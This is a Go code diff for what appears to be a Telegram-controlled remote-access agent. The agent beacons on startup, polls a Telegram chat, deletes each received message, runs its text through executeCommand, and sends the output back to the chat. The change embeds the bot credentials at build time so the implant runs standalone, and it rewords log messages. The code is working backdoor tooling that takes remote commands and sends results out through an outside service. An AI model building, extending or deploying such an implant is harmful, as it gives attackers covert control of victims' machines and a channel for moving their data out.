@@ -3,10 +3,7 @@ package main
 import (
 	"fmt"
 	"math/rand"
-	"os"
 	"time"
-
-	"github.com/joho/godotenv"
 )
 
 // sleepWithProfile waits according to the active beacon profile.
@@ -38,7 +35,7 @@ func startupBeacon() {
 	)
 
 	if err := sendMessage(msg); err != nil {
-		fmt.Println("[!] Startup beacon failed:", err)
+		fmt.Println("[!] Failed to send startup beacon:", err)
 	}
 }
 
@@ -56,7 +53,7 @@ func backoffSleep(errors int) {
 		backoff = Profile.BackoffMax
 	}
 
-	fmt.Printf("[!] Poll failed (%d), retrying in %s\n", errors, backoff)
+	fmt.Printf("[!] Polling failed (%d attempts), retrying in %s\n", errors, backoff)
 
 	time.Sleep(backoff)
 }
@@ -75,7 +72,7 @@ func runAgent() {
 
 			errCount++
 
-			fmt.Printf("[!] Poll error #%d: %v\n", errCount, err)
+			fmt.Printf("[!] Polling error #%d: %v\n", errCount, err)
 
 			backoffSleep(errCount)
 
@@ -92,7 +89,7 @@ func runAgent() {
 			}
 
 			if err := deleteMessage(update.Message.MessageID); err != nil {
-				fmt.Println("[!] Delete failed:", err)
+				fmt.Println("[!] Failed to delete message:", err)
 			}
 
 			result := executeCommand(update.Message.Text)
@@ -102,7 +99,7 @@ func runAgent() {
 			}
 
 			if err := sendMessage(result); err != nil {
-				fmt.Println("[!] Send failed:", err)
+				fmt.Println("[!] Failed to send message:", err)
 			}
 		}
 
@@ -112,29 +109,22 @@ func runAgent() {
 
 func main() {
 
-	// Load .env (ignored if file does not exist)
-	_ = godotenv.Load()
-
-	// Initialize credentials from environment
-	TOKEN = os.Getenv("TELEGRAM_BOT_TOKEN")
-	CHAT_ID = os.Getenv("TELEGRAM_CHAT_ID")
-
-	// Validate credentials
+	// Validate credentials (embedded at build time via -ldflags)
 	if TOKEN == "" || CHAT_ID == "" {
-		fmt.Println("[!] TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is not set")
+		fmt.Println("[!] Error: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not embedded")
 		return
 	}
 
-	// Load beacon profile
+	// Load beacon profile configuration
 	if err := LoadProfile(); err != nil {
-		fmt.Println("[!]", err)
+		fmt.Println("[!] Profile error:", err)
 		return
 	}
 
 	rand.Seed(time.Now().UnixNano())
 
-	fmt.Println("[*] Telegram Agent Started")
-	fmt.Printf("[*] Active Profile : %s\n", Profile.Name)
+	fmt.Println("[*] Telegram Agent started")
+	fmt.Printf("[*] Active profile: %s\n", Profile.Name)
 
 	startupBeacon()
 
